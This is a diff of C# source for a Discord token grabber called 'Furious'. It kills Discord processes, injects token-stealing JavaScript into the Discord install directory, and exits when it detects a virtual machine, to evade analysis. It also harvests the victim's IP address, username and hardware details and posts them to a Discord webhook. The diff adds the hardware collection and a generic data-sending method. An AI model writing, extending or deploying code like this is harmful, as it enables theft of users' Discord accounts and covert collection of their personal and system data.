@@ -1,10 +1,11 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Management;
 using System.Net;
 using System.Net.Http;
+using System.Text;
 using System.Threading.Tasks;
 
 namespace Furious
@@ -13,6 +14,7 @@ namespace Furious
     {
 		public static void CheckForVM()
 		{
+			///If the process is running within a Virtual Machine, the process will close before executing code.
 			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
 			{
 				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
@@ -22,28 +24,31 @@ namespace Furious
 						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
 						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
 						{
+							Console.WriteLine("Using VM: true");
 							Environment.Exit(0);
 						}
 					}
 				}
 			}
+			Console.WriteLine("Using VM: false");
 		}
 
-		public static async Task Start(bool grabIP = false, bool checkForVM = false)
+		public static async Task QuickStart(bool injectJS = false, bool grabIP = false, bool grabHardware = false, bool checkForVM = false)
 		{
+			///This method allows the user to customise what data is collected and whether they want to inject the token grabbing code.
 			if (checkForVM)
-			{
 				CheckForVM();
-			}
-
-			await InjectJS();
-
+			if (injectJS)
+				await InjectJS();
 			if (grabIP)
-				await SendIP();
+				await SendData(await GrabIP());
+			if (grabHardware)
+				await SendData(await GetHardware());
 		}
 
-		private static async Task InjectJS()
+		public static async Task InjectJS()
         {
+			///This method is used to write the token grabbing JavaScript code into the Discord directory.
 			CloseProcesses();
 
 			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
@@ -89,22 +94,51 @@ namespace Furious
 
 		private static void CloseProcesses()
 		{
+			///Closes all processes which contain "discord" in their name.
 			foreach (Process process in Process.GetProcesses())
 			{
 				if (process.ProcessName.ToLower().Contains("discord"))
 				{
 					process.Kill();
+					process.WaitForExit();
 				}
 			}
 		}
 
+		public static async Task<string> GetHardware()
+        {
+			///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
+			StringBuilder sb = new StringBuilder();
+
+			await Task.Run(() =>
+			{
+				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_Processor").Get())
+				{
+					sb.AppendLine($"CPU: {obj["Name"]}");
+				}
+				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_VideoController").Get())
+				{
+					sb.AppendLine($"GPU: {obj["Name"]}");
+				}
+				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
+                {
+					sb.AppendLine($"OS: {obj["Caption"]}");
+                }
+			});
+
+			Console.WriteLine(sb.ToString());
+			return sb.ToString();
+		}
+
 		private static async Task<string> GrabIP()
 		{
+			///This method collects the users IP address which can be sent to a webhook using the SendData method.
 			return await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");
 		}
 
-		public static async Task<HttpResponseMessage> SendIP()
+		public static async Task<HttpResponseMessage> SendData(string data)
 		{
+			///This method sends the data the paramater holds to a specified Discord webhook.
 			string hook = "webhook-here";
 			
 			HttpResponseMessage response = null;
@@ -114,7 +148,7 @@ namespace Furious
 				{
 					Dictionary<string, string> contents = new Dictionary<string, string>
 					{
-						{ "content", $"Data for '{ Environment.UserName }' @ { await Grabber.GrabIP() }" }
+						{ "content", $"Data for '{ Environment.UserName }' @ { await GrabIP() }	```{ data }```" }
 					};
 
                     response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
@@ -126,4 +160,5 @@ namespace Furious
 			}
 			return response;
 		}
+	}
 }
